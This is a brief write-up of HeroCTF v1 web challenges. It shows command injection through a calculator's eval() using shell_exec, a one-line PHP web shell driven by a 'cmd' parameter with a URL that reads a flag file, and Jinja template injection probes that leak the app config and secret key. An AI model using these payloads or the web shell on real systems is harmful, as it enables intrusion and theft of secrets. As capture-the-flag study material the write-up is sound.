#Cyber-Security Training
#j3kyll
#PATH :~/Vidéos/Hyd3-100Days/Ted_2.0/Security-Advanced/V? heroctf/HeroCTF_v1/web

V-WEB
1-
For this challenge  a calculator is used and when you write a operations the answers is display but when you don't write a operations and you validate one error appears ,the error concerned 'eval()' functions

`shell_exec("ls")`  for used a shell in the code 
one file is show 
calculator.php
` shell_exec("cat calculator.php")`

 ```php
<?php
  // HeroCTF{us1ng_3v4l_functi0n_1s_b4d}
?>
```

2-
Here you upload a code for to have access a shell
```php
<?php
  print_r(shell_exec($_GET['cmd']));
?>
```

you can to walk in a tree structure with `?cmd=` until to find the flag 
`http://heroctf.fr:6200/tmp/shell.php?cmd=cat+/dossiersupersecret/flag.txt`
3-In this challenge the web site we is given and you can see the source code of site 
the flag is into 

4-Introduction a Jinja exploitation
When you going in the site ,try the jinja injection 


write the tentative operations bizarre   
Ex:`{{3*'3'}}{{3*3}}`

Aif the result is 3339 so write:

`{{config.items()}}` and the source code appears

```php
Hello dict_items([(&#39;ENV&#39;, &#39;production&#39;), (&#39;DEBUG&#39;, False), (&#39;TESTING&#39;, False), (&#39;PROPAGATE_EXCEPTIONS&#39;, None), (&#39;PRESERVE_CONTEXT_ON_EXCEPTION&#39;, None), (&#39;SECRET_KEY&#39;, &#39;j1nj4_1nj3c710n_700_345y_4_m3_10114320&#39;), (&#39;PERMANENT_SESSION_LIFETIME&#39;, datetime.timedelta(days=31)), (&#39;USE_X_SENDFILE&#39;, False), (&#39;SERVER_NAME&#39;, None), (&#39;APPLICATION_ROOT&#39;, &#39;/&#39;), (&#39;SESSION_COOKIE_NAME&#39;, &#39;session&#39;), (&#39;SESSION_COOKIE_DOMAIN&#39;, False), (&#39;SESSION_COOKIE_PATH&#39;, None), (&#39;SESSION_COOKIE_HTTPONLY&#39;, True), (&#39;SESSION_COOKIE_SECURE&#39;, False), (&#39;SESSION_COOKIE_SAMESITE&#39;, None), (&#39;SESSION_REFRESH_EACH_REQUEST&#39;, True), (&#39;MAX_CONTENT_LENGTH&#39;, None), (&#39;SEND_FILE_MAX_AGE_DEFAULT&#39;, datetime.timedelta(seconds=43200)), (&#39;TRAP_BAD_REQUEST_ERRORS&#39;, None), (&#39;TRAP_HTTP_EXCEPTIONS&#39;, False), (&#39;EXPLAIN_TEMPLATE_LOADING&#39;, False), (&#39;PREFERRED_URL_SCHEME&#39;, &#39;http&#39;), (&#39;JSON_AS_ASCII&#39;, True), (&#39;JSON_SORT_KEYS&#39;, True), (&#39;JSONIFY_PRETTYPRINT_REGULAR&#39;, False), (&#39;JSONIFY_MIMETYPE&#39;, &#39;application/json&#39;), (&#39;TEMPLATES_AUTO_RELOAD&#39;, None), (&#39;MAX_COOKIE_SIZE&#39;, 4093)])
```

flag:j1nj4_1nj3c710n_700_345y_4_m3_10114320








End -Report
